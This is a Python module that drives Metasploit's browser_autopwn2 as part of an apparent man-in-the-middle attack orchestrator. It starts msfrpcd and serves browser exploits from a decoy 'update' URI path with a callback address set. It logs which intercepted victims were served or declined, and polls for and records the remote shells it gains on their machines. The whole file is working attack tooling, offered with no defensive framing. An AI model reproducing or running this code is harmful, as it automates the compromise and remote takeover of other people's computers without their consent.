"""
Metasploit control for the MITM autopwn orchestrator.
Starts a dedicated msfrpcd, connects over RPC, and launches browser_autopwn2
inside a console so its serving and handling output is observable. Console
output feeds delivery and attempt tracking so failed page loads surface, and
session list polling feeds confirmed shells. Sessions are deduplicated by id and
recorded with via_exploit so phantom broadcast counts are not inflated.
"""

import re
import time
import socket
import subprocess

from pymetasploit3.msfrpc import MsfRpcClient


AUTOPWN_MODULE = "auxiliary/server/browser_autopwn2"

SERVE_MARKERS = [
    "handling '", "gathering target", "serving exploit", "sending",
    "requesting", "responsive", "received request", "starting exploit",
]
DECLINE_MARKERS = [
    "declined", "not compatible", "target not", "no suitable",
    "ignoring", "not vulnerable",
]

IP_RE = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")


class MetasploitAutopwn:
    def __init__(self, state, password, host="127.0.0.1", port=55553,
                 lhost=None, srvport=8888, uripath="update", exclude_pattern=None,
                 binary="msfrpcd"):
        self.state = state
        self.password = password
        self.host = host
        self.port = port
        self.lhost = lhost
        self.srvport = srvport
        self.uripath = uripath.strip("/")
        self.exclude_pattern = exclude_pattern
        self.binary = binary
        self.proc = None
        self.client = None
        self.console = None
        self.cid = None
        self.srvuri = None

    def start_daemon(self, ready_timeout=40):
        cmd = [self.binary, "-P", self.password, "-a", self.host, "-p", str(self.port), "-S"]
        self.proc = subprocess.Popen(
            cmd, stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        self._wait_for_port(ready_timeout)

    def _wait_for_port(self, timeout):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.proc.poll() is not None:
                raise RuntimeError("msfrpcd exited during startup")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                if s.connect_ex((self.host, self.port)) == 0:
                    time.sleep(2)
                    return
            time.sleep(1)
        raise RuntimeError("msfrpcd did not open port %d" % self.port)

    def connect(self, retries=20):
        last = None
        for _ in range(retries):
            try:
                self.client = MsfRpcClient(self.password, server=self.host,
                                           port=self.port, ssl=False)
                return
            except Exception as exc:
                last = exc
                time.sleep(2)
        raise RuntimeError("could not connect to msfrpcd (%s)" % last)

    def setup_autopwn(self):
        self.console = self.client.consoles.console()
        self.cid = self.console.cid
        self._drain()

        lines = [
            "use %s" % AUTOPWN_MODULE,
            "set SRVHOST 0.0.0.0",
            "set SRVPORT %d" % self.srvport,
            "set URIPATH /%s" % self.uripath,
            "set LHOST %s" % self.lhost,
        ]
        if self.exclude_pattern:
            lines.append("set EXCLUDE_PATTERN %s" % self.exclude_pattern)
        lines.append("run")

        for line in lines:
            self.console.write(line)
            time.sleep(0.4)

        self.srvuri = "http://%s:%d/%s" % (self.lhost, self.srvport, self.uripath)
        self.state.log("msf", "autopwn serving at %s" % self.srvuri)
        return self.srvuri

    def _drain(self):
        try:
            self.console.read()
        except Exception:
            pass

    def monitor_console(self, stop_event):
        while not stop_event.is_set():
            try:
                out = self.console.read()
                data = out.get("data", "") if isinstance(out, dict) else ""
                if data:
                    for raw in data.splitlines():
                        self._parse_console(raw.strip())
            except Exception:
                pass
            time.sleep(1.0)

    def _parse_console(self, line):
        if not line:
            return
        low = line.lower()
        ip = self._extract_ip(line)

        if any(m in low for m in SERVE_MARKERS):
            if ip:
                self.state.mark_served(ip)
            self.state.add_exploit_attempt(ip or "?", AUTOPWN_MODULE, line[:160])
            return

        if any(m in low for m in DECLINE_MARKERS):
            if ip:
                self.state.mark_failed(ip, "declined")
            self.state.add_exploit_attempt(ip or "?", AUTOPWN_MODULE, line[:160])
            return

        if "exploit" in low and ip:
            self.state.add_exploit_attempt(ip, AUTOPWN_MODULE, line[:160])

    def _extract_ip(self, text):
        m = IP_RE.search(text)
        return m.group(1) if m else None

    def monitor_sessions(self, stop_event):
        while not stop_event.is_set():
            try:
                sessions = self.client.sessions.list
                for sid, info in sessions.items():
                    peer = info.get("tunnel_peer", "") or ""
                    host = info.get("session_host") or peer.split(":")[0]
                    platform = info.get("platform") or info.get("via_payload", "")
                    stype = info.get("type", "")
                    via = info.get("via_exploit", "")
                    if self.state.add_session(str(sid), host or "?", platform, stype, via):
                        if host:
                            self.state.mark_exploited(host)
                        self.state.log("msf", "session %s on %s via %s" % (sid, host, via))
            except Exception:
                pass
            time.sleep(2.0)

    def stop(self):
        try:
            if self.console is not None:
                self.console.write("jobs -K")
                time.sleep(0.5)
                self.console.destroy()
        except Exception:
            pass
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=5)
            except Exception:
                self.proc.kill()
